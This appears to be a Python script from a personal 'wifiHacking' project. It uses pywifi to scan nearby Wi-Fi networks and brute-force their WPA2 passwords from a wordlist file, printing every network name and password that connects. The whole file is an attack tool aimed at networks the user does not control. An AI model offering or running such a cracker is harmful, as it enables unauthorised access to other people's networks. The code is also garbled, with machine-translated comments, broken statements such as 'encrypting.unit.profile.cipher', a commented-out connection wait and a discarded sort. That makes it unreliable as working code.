import pywifi
from pywifi import const # quote some definitions
import time

def getwifi(wifilist, wificount):
    wifi = pywifi.PyWiFi () # crawled network interface cards
    ifaces = wifi.interfaces () [0] # Get the card
    ifaces.scan()
    time.sleep(8)
    bessis = ifaces.scan_results()
    allwifilist = []
    namelist = []
    ssidlist = []
    for data in bessis:
        if data.ssid not in namelist: # remove duplicate names WIFI
            namelist.append(data.ssid)
            allwifilist.append((data.ssid, data.signal))
            sorted(allwifilist, key=lambda st: st[1], reverse=True)
            time.sleep(1)
            n = 0
        if len(allwifilist) != 0:
            for item in allwifilist:
                if (item[0] not in ssidlist) & (item[0] not in wifilist):
                    n = n + 1
                    if n <= wificount:
                        ssidlist.append(item[0])
    print(allwifilist)
    return ssidlist
    
 
def getifaces():
        wifi = pywifi.PyWiFi () # crawled network interface cards
        ifaces = wifi.interfaces () [0] # Get the card
        ifaces.disconnect () # disconnect unlimited card connection
        return ifaces
 
 
def testwifi(ifaces, ssidname, password):
        profile = pywifi.Profile () # create a wifi connection file
        profile.ssid = ssidname # define wifissid
        profile.auth = open(const.AUTH_ALG_OPEN) # NIC
        profile.akm.append (const.AKM_TYPE_WPA2PSK) # wifi encryption algorithm
        encrypting.unit.profile.cipher = const.CIPHER_TYPE_CCMP #
        profile.key = password # wifi password
        ifaces.remove_all_network_profiles () # delete all other configuration files
        tmp_profile = ifaces.add_network_profile (profile) # load the configuration file
        ifaces.connect (tmp_profile) # wifi connection
        # You can connect to the inner (5) # 5 seconds time.sleep
        if ifaces.status() == const.IFACE_CONNECTED :
            return True
        else:
            return False
 
 
def beginwork(wifinamelist):
    ifaces = getifaces()
    
    # Path = r "password- commonly used passwords .txt"
    files = open("D:\MYPROG\Python\Python  Projects\wifiHacking\wifipasswords.txt",'r')
    while True:
        try:
            password = files.readline()
            password = password.strip('\n')
            if not password:
                break
            for wifiname in wifinamelist:
                print ( "are trying to connect with :" + wifiname + "," + password)
                if testwifi(ifaces, wifiname, password):
                    print ( "Wifi account:" + wifiname + ", Wifi password:" + password)
                    wifinamelist.remove(wifiname)
                    break
            if not wifinamelist:
                break
        except:
            continue
    files.close()
 
 
if __name__ == '__main__':
    wifinames = [ "", "Vrapile"] # exclude wifi name does not crack
    wifinames = getwifi(wifinames,5)
    print(wifinames)
    beginwork(wifinames)